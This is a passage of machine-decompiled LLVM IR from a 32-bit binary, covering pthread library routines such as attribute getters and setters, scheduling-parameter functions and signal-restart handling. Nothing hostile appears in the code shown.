  store i32 ptrtoint (i32* @global_var_2be5c.256 to i32), i32* %r3.global-to-local, align 4
  %v2_dde8 = load i32, i32* @global_var_2be5c.256, align 4
  store i32 %v2_dde8, i32* %r0.global-to-local, align 4
  %v1_ddec = call i32 @__GI__exit(i32 %v2_dde8)
  unreachable

dec_label_pc_ddf0:                                ; preds = %dec_label_pc_ddb8
  %v1_ddf0 = add i32 %v9_ddf8, 66
  %v2_ddf0 = inttoptr i32 %v1_ddf0 to i8*
  %v3_ddf0 = load i8, i8* %v2_ddf0, align 1
  %v4_ddf0 = zext i8 %v3_ddf0 to i32
  store i32 %v4_ddf0, i32* %r3.global-to-local, align 4
  %v2_ddf4 = icmp eq i8 %v3_ddf0, 0
  br i1 %v2_ddf4, label %bb6, label %bb7

bb6:                                              ; preds = %dec_label_pc_ddf0
  %v3_ddf8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_ddf8, i32* %r4.global-to-local, align 4
  ret i32 %v9_ddf8

bb7:                                              ; preds = %dec_label_pc_ddf0
  %v1_ddfc = add i32 %v9_ddf8, 64
  %v2_ddfc = inttoptr i32 %v1_ddfc to i8*
  %v3_ddfc = load i8, i8* %v2_ddfc, align 1
  %v4_ddfc = zext i8 %v3_ddfc to i32
  store i32 %v4_ddfc, i32* %r2.global-to-local, align 4
  %v2_de00 = icmp eq i8 %v3_ddfc, 0
  br i1 %v2_de00, label %bb9, label %bb8

bb8:                                              ; preds = %bb7
  %v3_de04 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_de04, i32* %r4.global-to-local, align 4
  ret i32 %v9_ddf8

bb9:                                              ; preds = %bb7
  %v1_de08 = add i32 %v9_ddf8, 65
  %v2_de08 = inttoptr i32 %v1_de08 to i8*
  %v3_de08 = load i8, i8* %v2_de08, align 1
  %v4_de08 = zext i8 %v3_de08 to i32
  store i32 %v4_de08, i32* %r3.global-to-local, align 4
  %v7_de0c = icmp eq i8 %v3_de08, 1
  br i1 %v7_de0c, label %bb10, label %.thread2

bb10:                                             ; preds = %bb9
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %bb9, %bb10
  call void @__pseudo_cond_branch(i1 %v7_de0c, i32 ptrtoint (i32* @global_var_ecfc.435 to i32))
  %v0_de1c = load i32, i32* %r0.global-to-local, align 4
  %v1_de1c = add i32 %v0_de1c, 40
  %v2_de1c = inttoptr i32 %v1_de1c to i32*
  %v3_de1c = load i32, i32* %v2_de1c, align 4
  store i32 %v3_de1c, i32* %r3.global-to-local, align 4
  %v2_de20 = icmp eq i32 %v3_de1c, 0
  br i1 %v2_de20, label %bb11, label %bb12

bb11:                                             ; preds = %.thread2
  %v3_de24 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_de24, i32* %r4.global-to-local, align 4
  ret i32 %v0_de1c

bb12:                                             ; preds = %.thread2
  %v0_de28 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_de28, i32* %v2_de1c, align 4
  %v0_de30 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_de30, i32* %r0.global-to-local, align 4
  %v2_de34 = call i32 @siglongjmp(i32 %v0_de30, i32 1)
  store i32 %v2_de34, i32* %r0.global-to-local, align 4
  ret i32 %v2_de34

; uselistorder directives
  uselistorder i32 %v9_ddf8, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 7, 3, 5, 6, 1, 8, 0 }
  uselistorder i32* @global_var_2be5c.256, { 1, 0, 2 }
  uselistorder i32* @global_var_2be58.254, { 1, 0, 2 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_ddb8, { 1, 0 }
}

define i32 @pthread_handle_sigrestart(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_de48 = load i32, i32* @r4, align 4
  store i32 %v3_de48, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v0_de50 = call i32 @_thread_self.3()
  %v1_de54 = add i32 %v0_de50, 36
  %v2_de54 = inttoptr i32 %v1_de54 to i32*
  %v3_de54 = load i32, i32* %v2_de54, align 4
  store i32 %v3_de54, i32* %r3.global-to-local, align 4
  %v2_de58 = icmp eq i32 %v3_de54, 0
  %v0_de5c = load i32, i32* %r4.global-to-local, align 4
  %v2_de5c = add i32 %v0_de50, 32
  %v3_de5c = inttoptr i32 %v2_de5c to i32*
  store i32 %v0_de5c, i32* %v3_de5c, align 4
  br i1 %v2_de58, label %bb, label %bb3

bb:                                               ; preds = %entry
  %v3_de60 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_de60, i32* %r4.global-to-local, align 4
  ret i32 %v0_de50

bb3:                                              ; preds = %entry
  %v0_de64 = load i32, i32* %r3.global-to-local, align 4
  %v2_de6c = call i32 @siglongjmp(i32 %v0_de64, i32 1)
  ret i32 %v2_de6c

; uselistorder directives
  uselistorder i32 (i32, i32)* @siglongjmp, { 1, 0 }
  uselistorder i32 ()* @_thread_self.3, { 6, 5, 4, 2, 1, 3, 0 }
}

define i32 @__pthread_initialize_minimal() local_unnamed_addr {
entry:
  %v1_de78 = call i32 @__libc_pthread_init(i32 0)
  store i32 %v1_de78, i32* @global_var_2be60.404, align 4
  ret i32 %v1_de78
}

define i32 @pthread_setschedparam(i32 %arg1, i32 %arg2, i32* %arg3) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %v3_de9c = urem i32 %arg1, 1024
  %v4_dea0 = mul nuw nsw i32 %v3_de9c, 16
  %v5_dea0 = add i32 %v4_dea0, ptrtoint (i32* @global_var_270a0.207 to i32)
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r8.global-to-local, align 4
  %v2_deb4 = call i32 @__pthread_lock(i32 %v5_dea0, i32 0)
  %v0_deb8 = load i32, i32* @r5, align 4
  %v1_deb8 = add i32 %v0_deb8, 8
  %v2_deb8 = inttoptr i32 %v1_deb8 to i32*
  %v3_deb8 = load i32, i32* %v2_deb8, align 4
  store i32 %v3_deb8, i32* @r4, align 4
  %v2_debc = icmp eq i32 %v3_deb8, 0
  br i1 %v2_debc, label %dec_label_pc_ded0, label %dec_label_pc_dec4

dec_label_pc_dec4:                                ; preds = %entry
  %v1_dec4 = add i32 %v3_deb8, 16
  %v2_dec4 = inttoptr i32 %v1_dec4 to i32*
  %v3_dec4 = load i32, i32* %v2_dec4, align 4
  %v1_dec8 = load i32, i32* %r7.global-to-local, align 4
  %v9_dec8 = icmp eq i32 %v3_dec4, %v1_dec8
  br i1 %v9_dec8, label %dec_label_pc_dee0, label %dec_label_pc_ded0

dec_label_pc_ded0:                                ; preds = %dec_label_pc_dec4, %entry
  %v1_ded4 = call i32 @__pthread_unlock(i32 %v0_deb8)
  ret i32 3

dec_label_pc_dee0:                                ; preds = %dec_label_pc_dec4
  %v0_deec = call i32 @sched_setscheduler()
  %v3_def0 = icmp eq i32 %v0_deec, -1
  br i1 %v3_def0, label %dec_label_pc_def8, label %dec_label_pc_df0c

dec_label_pc_def8:                                ; preds = %dec_label_pc_dee0
  %v0_def8 = load i32, i32* @r5, align 4
  %v1_defc = call i32 @__pthread_unlock(i32 %v0_def8)
  %v0_df00 = call i32 @__errno_location()
  %v1_df04 = inttoptr i32 %v0_df00 to i32*
  %v2_df04 = load i32, i32* %v1_df04, align 4
  ret i32 %v2_df04

dec_label_pc_df0c:                                ; preds = %dec_label_pc_dee0
  %v0_df0c = load i32, i32* %r6.global-to-local, align 4
  %v2_df0c = icmp eq i32 %v0_df0c, 0
  br i1 %v2_df0c, label %bb12, label %bb

bb:                                               ; preds = %dec_label_pc_df0c
  %v1_df10 = load i32, i32* %r8.global-to-local, align 4
  %v2_df10 = inttoptr i32 %v1_df10 to i32*
  %v3_df10 = load i32, i32* %v2_df10, align 4
  br label %bb12

bb12:                                             ; preds = %dec_label_pc_df0c, %bb
  %storemerge = phi i32 [ %v3_df10, %bb ], [ 0, %dec_label_pc_df0c ]
  %v1_df18 = load i32, i32* @r4, align 4
  %v2_df18 = add i32 %v1_df18, 24
  %v3_df18 = inttoptr i32 %v2_df18 to i32*
  store i32 %storemerge, i32* %v3_df18, align 4
  %v0_df1c = load i32, i32* @r5, align 4
  %v1_df20 = call i32 @__pthread_unlock(i32 %v0_df1c)
  %v2_df28 = load i32, i32* @global_var_2b484.197, align 4
  %v1_df2c = icmp slt i32 %v2_df28, 0
  br i1 %v1_df2c, label %bb13, label %bb14

bb13:                                             ; preds = %bb12
  ret i32 0

bb14:                                             ; preds = %bb12
  %v0_df38 = load i32, i32* @r4, align 4
  %v1_df38 = add i32 %v0_df38, 24
  %v2_df38 = inttoptr i32 %v1_df38 to i32*
  %v3_df38 = load i32, i32* %v2_df38, align 4
  %v1_df3c = call i32 @__pthread_manager_adjust_prio(i32 %v3_df38)
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32)* @__pthread_manager_adjust_prio, { 1, 2, 0 }
  uselistorder label %bb12, { 1, 0 }
}

define i32 @__GI_pthread_getschedparam(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_df50 = load i32, i32* @r4, align 4
  store i32 %v3_df50, i32* %stack_var_-24, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v3_df60 = urem i32 %arg1, 1024
  %v4_df64 = mul nuw nsw i32 %v3_df60, 16
  %v5_df64 = add i32 %v4_df64, ptrtoint (i32* @global_var_270a0.207 to i32)
  store i32 %v5_df64, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r8.global-to-local, align 4
  %v2_df78 = call i32 @__pthread_lock(i32 %v5_df64, i32 0)
  %v1_df7c = add i32 %v4_df64, add (i32 ptrtoint (i32* @global_var_270a0.207 to i32), i32 8)
  %v2_df7c = inttoptr i32 %v1_df7c to i32*
  %v3_df7c = load i32, i32* %v2_df7c, align 4
  %v2_df80 = icmp eq i32 %v3_df7c, 0
  br i1 %v2_df80, label %dec_label_pc_dfa0, label %dec_label_pc_df8c

dec_label_pc_df8c:                                ; preds = %entry
  %v1_df8c = add i32 %v3_df7c, 16
  %v2_df8c = inttoptr i32 %v1_df8c to i32*
  %v3_df8c = load i32, i32* %v2_df8c, align 4
  %v1_df90 = load i32, i32* %r4.global-to-local, align 4
  %v2_df90 = sub i32 %v3_df8c, %v1_df90
  store i32 %v2_df90, i32* %r6.global-to-local, align 4
  %v9_df90 = icmp eq i32 %v3_df8c, %v1_df90
  br i1 %v9_df90, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_df8c
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_dfa0

bb:                                               ; preds = %dec_label_pc_df8c
  %v2_df98 = icmp eq i32 %v2_df90, 0
  br i1 %v2_df98, label %dec_label_pc_dfac, label %dec_label_pc_dfa0

dec_label_pc_dfa0:                                ; preds = %.thread, %bb, %entry
  %v1_dfa0 = call i32 @__pthread_unlock(i32 %v5_df64)
  %v2_dfa8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_dfa8, i32* %r4.global-to-local, align 4
  ret i32 3

dec_label_pc_dfac:                                ; preds = %bb
  %v1_dfac = add i32 %v3_df7c, 20
  %v2_dfac = inttoptr i32 %v1_dfac to i32*
  %v3_dfac = load i32, i32* %v2_dfac, align 4
  store i32 %v3_dfac, i32* @r4, align 4
  %v1_dfb4 = call i32 @__pthread_unlock(i32 %v5_df64)
  %v0_dfbc = call i32 @sched_getscheduler()
  store i32 %v0_dfbc, i32* %r5.global-to-local, align 4
  %v7_dfc4 = icmp eq i32 %v0_dfbc, -1
  br i1 %v7_dfc4, label %dec_label_pc_dfe0, label %dec_label_pc_dfd4

dec_label_pc_dfd4:                                ; preds = %dec_label_pc_dfac
  %v0_dfd4 = call i32 @sched_getparam()
  %v3_dfd8 = icmp eq i32 %v0_dfd4, -1
  br i1 %v3_dfd8, label %dec_label_pc_dfe0, label %dec_label_pc_dfec

dec_label_pc_dfe0:                                ; preds = %dec_label_pc_dfd4, %dec_label_pc_dfac
  %v0_dfe0 = call i32 @__errno_location()
  %v1_dfe4 = inttoptr i32 %v0_dfe0 to i32*
  %v2_dfe4 = load i32, i32* %v1_dfe4, align 4
  %v2_dfe8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_dfe8, i32* %r4.global-to-local, align 4
  ret i32 %v2_dfe4

dec_label_pc_dfec:                                ; preds = %dec_label_pc_dfd4
  %v0_dfec = load i32, i32* %r6.global-to-local, align 4
  %v0_dff0 = load i32, i32* %r5.global-to-local, align 4
  %v1_dff0 = load i32, i32* %r8.global-to-local, align 4
  %v2_dff0 = inttoptr i32 %v1_dff0 to i32*
  store i32 %v0_dff0, i32* %v2_dff0, align 4
  %v2_dff4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_dff4, i32* %r4.global-to-local, align 4
  ret i32 %v0_dfec

; uselistorder directives
  uselistorder i32 %v3_df8c, { 1, 0 }
  uselistorder i32 %v5_df64, { 1, 0, 2, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_dfa0, { 1, 0, 2 }
}

define i32 @pthread_attr_destroy() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__GI_pthread_attr_setdetachstate(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = or i32 %arg2, 1
  %tmp3 = icmp eq i32 %tmp, 1
  %. = select i1 %tmp3, i32 0, i32 22
  store i32 %., i32* %r3.global-to-local, align 4
  br i1 %tmp3, label %bb, label %bb2

bb:                                               ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  %v0_e014.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v0_e014 = phi i32 [ 22, %entry ], [ %v0_e014.pre, %bb ]
  ret i32 %v0_e014

; uselistorder directives
  uselistorder i1 %tmp3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__GI_pthread_attr_getdetachstate(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_e01c = load i32, i32* %arg1, align 4
  %v2_e024 = inttoptr i32 %arg2 to i32*
  store i32 %v2_e01c, i32* %v2_e024, align 4
  ret i32 0
}

define i32 @__GI_pthread_attr_setschedpolicy(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg2, 3
  %. = select i1 %tmp, i32 0, i32 22
  store i32 %., i32* %r3.global-to-local, align 4
  br i1 %tmp, label %bb, label %bb2

bb:                                               ; preds = %entry
  %v6_e038 = add i32 %arg1, 4
  %v7_e038 = inttoptr i32 %v6_e038 to i32*
  store i32 %arg2, i32* %v7_e038, align 4
  %v0_e03c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v0_e03c = phi i32 [ 22, %entry ], [ %v0_e03c.pre, %bb ]
  ret i32 %v0_e03c

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @pthread_attr_getschedpolicy(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_e044 = add i32 %arg1, 4
  %v2_e044 = inttoptr i32 %v1_e044 to i32*
  %v3_e044 = load i32, i32* %v2_e044, align 4
  store i32 %v3_e044, i32* %arg2, align 4
  ret i32 0
}

define i32 @pthread_attr_setinheritsched(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = or i32 %arg2, 1
  %tmp3 = icmp eq i32 %tmp, 1
  %. = select i1 %tmp3, i32 0, i32 22
  store i32 %., i32* %r3.global-to-local, align 4
  br i1 %tmp3, label %bb, label %bb2

bb:                                               ; preds = %entry
  %v6_e060 = add i32 %arg1, 12
  %v7_e060 = inttoptr i32 %v6_e060 to i32*
  store i32 %arg2, i32* %v7_e060, align 4
  %v0_e064.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v0_e064 = phi i32 [ 22, %entry ], [ %v0_e064.pre, %bb ]
  ret i32 %v0_e064

; uselistorder directives
  uselistorder i1 %tmp3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @pthread_attr_getinheritsched(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_e06c = add i32 %arg1, 12
  %v2_e06c = inttoptr i32 %v1_e06c to i32*
  %v3_e06c = load i32, i32* %v2_e06c, align 4
  store i32 %v3_e06c, i32* %arg2, align 4
  ret i32 0
}

define i32 @pthread_attr_setscope(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_e07c = icmp eq i32 %arg2, 0
  br i1 %v2_e07c, label %dec_label_pc_e094, label %dec_label_pc_e084

dec_label_pc_e084:                                ; preds = %entry
  %v7_e084 = icmp eq i32 %arg2, 1
  %. = select i1 %v7_e084, i32 95, i32 22
  ret i32 %.

dec_label_pc_e094:                                ; preds = %entry
  %v2_e094 = add i32 %arg1, 16
  %v3_e094 = inttoptr i32 %v2_e094 to i32*
  store i32 0, i32* %v3_e094, align 4
  ret i32 0
}

define i32 @pthread_attr_getscope(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_e0a0 = add i32 %arg1, 16
  %v2_e0a0 = inttoptr i32 %v1_e0a0 to i32*
  %v3_e0a0 = load i32, i32* %v2_e0a0, align 4
  store i32 %v3_e0a0, i32* %arg2, align 4
  ret i32 0
}

define i32 @__pthread_attr_getguardsize(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_e0b0 = add i32 %arg1, 20
  %v2_e0b0 = inttoptr i32 %v1_e0b0 to i32*
  %v3_e0b0 = load i32, i32* %v2_e0b0, align 4
  store i32 %v3_e0b0, i32* %arg2, align 4
  ret i32 0
}

define i32 @__pthread_attr_setstackaddr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_e0c4 = add i32 %arg1, 24
  %v3_e0c4 = inttoptr i32 %v2_e0c4 to i32*
  store i32 1, i32* %v3_e0c4, align 4
  %v2_e0c8 = add i32 %arg1, 28
  %v3_e0c8 = inttoptr i32 %v2_e0c8 to i32*
  store i32 %arg2, i32* %v3_e0c8, align 4
  ret i32 0
}

define i32 @__pthread_attr_getstackaddr(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_e0d4 = add i32 %arg1, 28
  %v2_e0d4 = inttoptr i32 %v1_e0d4 to i32*
  %v3_e0d4 = load i32, i32* %v2_e0d4, align 4
  store i32 %v3_e0d4, i32* %arg2, align 4
  ret i32 0
}

define i32 @__pthread_attr_setstacksize(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %v2_e0e4 = icmp ugt i32 %arg2, 16383
  %. = select i1 %v2_e0e4, i32 0, i32 22
  store i32 %., i32* %r3.global-to-local, align 4
  br i1 %v2_e0e4, label %bb, label %bb2

bb:                                               ; preds = %entry
  %v3_e0f0 = add i32 %arg1, 32
  %v4_e0f0 = inttoptr i32 %v3_e0f0 to i32*
  store i32 %arg2, i32* %v4_e0f0, align 4
  %v0_e0f4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v0_e0f4 = phi i32 [ 22, %entry ], [ %v0_e0f4.pre, %bb ]
  ret i32 %v0_e0f4

; uselistorder directives
  uselistorder i1 %v2_e0e4, { 1, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__pthread_attr_getstacksize(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_e0fc = add i32 %arg1, 32
  %v2_e0fc = inttoptr i32 %v1_e0fc to i32*
  %v3_e0fc = load i32, i32* %v2_e0fc, align 4
  store i32 %v3_e0fc, i32* %arg2, align 4
  ret i32 0
}

define i32 @__GI_pthread_attr_init(i32* %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  %v3_e10c = load i32, i32* @r4, align 4
  store i32 %v3_e10c, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v0_e114 = call i32 @__GI_getpagesize()
  %v1_e118 = sub i32 2097152, %v0_e114
  store i32 %v0_e114, i32* %r2.global-to-local, align 4
  %v2_e120 = add i32 %tmp, 32
  %v3_e120 = inttoptr i32 %v2_e120 to i32*
  store i32 %v1_e118, i32* %v3_e120, align 4
  %v1_e12c = load i32, i32* %r4.global-to-local, align 4
  %v2_e12c = add i32 %v1_e12c, 12
  %v3_e12c = inttoptr i32 %v2_e12c to i32*
  store i32 1, i32* %v3_e12c, align 4
  %v1_e130 = load i32, i32* %r4.global-to-local, align 4
  %v2_e130 = inttoptr i32 %v1_e130 to i32*
  store i32 0, i32* %v2_e130, align 4
  %v1_e134 = load i32, i32* %r4.global-to-local, align 4
  %v2_e134 = add i32 %v1_e134, 4
  %v3_e134 = inttoptr i32 %v2_e134 to i32*
  store i32 0, i32* %v3_e134, align 4
  %v1_e138 = load i32, i32* %r4.global-to-local, align 4
  %v2_e138 = add i32 %v1_e138, 8
  %v3_e138 = inttoptr i32 %v2_e138 to i32*
  store i32 0, i32* %v3_e138, align 4
  %v1_e13c = load i32, i32* %r4.global-to-local, align 4
  %v2_e13c = add i32 %v1_e13c, 16
  %v3_e13c = inttoptr i32 %v2_e13c to i32*
  store i32 0, i32* %v3_e13c, align 4
  %v0_e140 = load i32, i32* %r2.global-to-local, align 4
  %v1_e140 = load i32, i32* %r4.global-to-local, align 4
  %v2_e140 = add i32 %v1_e140, 20
  %v3_e140 = inttoptr i32 %v2_e140 to i32*
  store i32 %v0_e140, i32* %v3_e140, align 4
  %v1_e144 = load i32, i32* %r4.global-to-local, align 4
  %v2_e144 = add i32 %v1_e144, 28
  %v3_e144 = inttoptr i32 %v2_e144 to i32*
  store i32 0, i32* %v3_e144, align 4
  %v1_e148 = load i32, i32* %r4.global-to-local, align 4
  %v2_e148 = add i32 %v1_e148, 24
  %v3_e148 = inttoptr i32 %v2_e148 to i32*
  store i32 0, i32* %v3_e148, align 4
  %v2_e14c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_e14c, i32* %r4.global-to-local, align 4
  ret i32 0
}

define i32 @__pthread_attr_setguardsize(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* %r6.global-to-local, align 4
  %v0_e15c = call i32 @__GI_getpagesize()
  %v2_e164 = add i32 %v0_e15c, %arg2
  %v1_e16c = add i32 %v2_e164, -1
  %v2_e170 = udiv i32 %v1_e16c, %v0_e15c
  store i32 %v2_e170, i32* %r0.global-to-local, align 4
  %v2_e174 = mul i32 %v2_e170, %v0_e15c
  %v0_e178 = load i32, i32* %r6.global-to-local, align 4
  %v1_e178 = add i32 %v0_e178, 32
  %v2_e178 = inttoptr i32 %v1_e178 to i32*
  %v3_e178 = load i32, i32* %v2_e178, align 4
  %v3_e17c = icmp uge i32 %v2_e174, %v3_e178
  %. = select i1 %v3_e17c, i32 22, i32 0
  store i32 %., i32* %r0.global-to-local, align 4
  br i1 %v3_e17c, label %bb6, label %bb

bb:                                               ; preds = %entry
  %v3_e188 = add i32 %v0_e178, 20
  %v4_e188 = inttoptr i32 %v3_e188 to i32*
  store i32 %v2_e174, i32* %v4_e188, align 4
  %v14_e18c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  %v14_e18c = phi i32 [ 22, %entry ], [ %v14_e18c.pre, %bb ]
  ret i32 %v14_e18c

; uselistorder directives
  uselistorder i1 %v3_e17c, { 1, 0 }
  uselistorder i32 %v0_e15c, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__GI_pthread_attr_getschedparam(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_e190 = add i32 %arg1, 8
  store i32 %arg2, i32* @r0, align 4
  store i32 4, i32* @r2, align 4
  store i32 %v1_e190, i32* @r1, align 4
  %v0_e1a4 = call i32 @memcpy()
  ret i32 0
}

define i32 @__GI_pthread_attr_setschedparam(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v0_e1c0 = call i32 @sched_get_priority_max()
  store i32 %v0_e1c0, i32* %r6.global-to-local, align 4
  %v0_e1cc = call i32 @sched_get_priority_min()
  %v0_e1d0 = load i32, i32* @r5, align 4
  %v1_e1d0 = inttoptr i32 %v0_e1d0 to i32*
  %v2_e1d0 = load i32, i32* %v1_e1d0, align 4
  %v5_e1d8 = icmp slt i32 %v2_e1d0, %v0_e1cc
  br i1 %v5_e1d8, label %dec_label_pc_e1fc, label %dec_label_pc_e1dc

dec_label_pc_e1dc:                                ; preds = %entry
  %v1_e1dc = load i32, i32* %r6.global-to-local, align 4
  %v0_e1e0 = load i32, i32* @r4, align 4
  %v1_e1e0 = add i32 %v0_e1e0, 8
  store i32 %v1_e1e0, i32* @r0, align 4
  store i32 %v0_e1d0, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v8_e1ec = icmp sgt i32 %v2_e1d0, %v1_e1dc
  br i1 %v8_e1ec, label %dec_label_pc_e1fc, label %dec_label_pc_e1f0

dec_label_pc_e1f0:                                ; preds = %dec_label_pc_e1dc
  %v0_e1f0 = call i32 @memcpy()
  ret i32 0

dec_label_pc_e1fc:                                ; preds = %dec_label_pc_e1dc, %entry
  ret i32 22
}

define i32 @_thread_self.5() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v2_e208 = load i32, i32* @global_var_2be4c.179, align 4
  %v0_e20c = load i32, i32* @sp, align 4
  %v3_e20c = icmp ult i32 %v0_e20c, %v2_e208
  %v1_e210 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_e210, i32* @r1, align 4
  br i1 %v3_e20c, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_e22c, %entry
  %merge = phi i32 [ ptrtoint (i32* @global_var_2b0c0 to i32), %entry ], [ ptrtoint (i32* @global_var_2b2a0.186 to i32), %dec_label_pc_e22c ]
  ret i32 %merge

bb3:                                              ; preds = %entry
  %v2_e220 = load i32, i32* @global_var_2be50.182, align 4
  %v3_e224 = icmp ult i32 %v0_e20c, %v2_e220
  br i1 %v3_e224, label %bb4, label %dec_label_pc_e22c

dec_label_pc_e22c:                                ; preds = %bb3
  %v2_e230 = load i32, i32* @global_var_2be54.184, align 4
  %v3_e234 = icmp ult i32 %v0_e20c, %v2_e230
  br i1 %v3_e234, label %bb, label %bb4

bb4:                                              ; preds = %dec_label_pc_e22c, %bb3
  %v2_e244 = load i32, i32* @global_var_30238.188, align 4
  store i32 %v2_e244, i32* @r2, align 4
  %v3_e248 = and i32 %v1_e210, -2097152
  %v4_e248 = xor i32 %v3_e248, -2097152
  %v2_e250 = icmp eq i32 %v2_e244, 0
  %v1_e254 = sub i32 -477, %v4_e248
  br i1 %v2_e250, label %dec_label_pc_e260, label %dec_label_pc_e25c

dec_label_pc_e25c:                                ; preds = %bb4
  %v1_e25c = call i32 @__pthread_find_self(i32 %v1_e254)
  br label %dec_label_pc_e260

dec_label_pc_e260:                                ; preds = %bb4, %dec_label_pc_e25c
  %v0_e260 = phi i32 [ %v1_e254, %bb4 ], [ %v1_e25c, %dec_label_pc_e25c ]
  %v1_e260 = add i32 %v0_e260, -3
  ret i32 %v1_e260

; uselistorder directives
  uselistorder i32 %v1_e254, { 1, 0 }
  uselistorder label %dec_label_pc_e260, { 1, 0 }
}

define i32 @__pthread_perform_cleanup(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_e280 = load i32, i32* @r4, align 4
  store i32 %v3_e280, i32* %stack_var_-16, align 4
  %v6_e280 = load i32, i32* @r5, align 4
  %v9_e280 = load i32, i32* @r6, align 4
  %v12_e280 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* %r6.global-to-local, align 4
  %v0_e288 = call i32 @_thread_self.5()
  store i32 %v0_e288, i32* %r0.global-to-local, align 4
  %v1_e28c = add i32 %v0_e288, 60
  %v2_e28c = inttoptr i32 %v1_e28c to i32*
  %v3_e28c = load i32, i32* %v2_e28c, align 4
  store i32 %v3_e28c, i32* %r4.global-to-local, align 4
